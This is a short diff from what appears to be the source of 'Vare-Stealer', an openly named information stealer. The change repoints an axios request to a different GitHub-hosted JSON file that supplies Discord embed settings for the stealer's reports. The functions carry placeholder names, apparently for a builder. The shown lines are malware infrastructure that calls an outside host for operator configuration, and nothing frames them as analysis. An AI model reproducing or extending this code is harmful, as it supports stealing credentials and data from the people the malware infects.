@@ -125,7 +125,7 @@ async function %GETNETWORK%() {
 
 async function %GETEMBED%() {
   let embdata = {};
-  let embed = JSON.parse(JSON.stringify((await axios.get("https://raw.githubusercontent.com/saintdaddy/vare-stealer/main/vare.json")).data));
+  let embed = JSON.parse(JSON.stringify((await axios.get("https://raw.githubusercontent.com/adasdasdsaf/Vare-Stealer/main/vare.json")).data));
   embdata["avatar"] = embed.avatarurl;
   embdata["url"] = embed.discord;
   embdata["footericon"] = embed.footerurl;
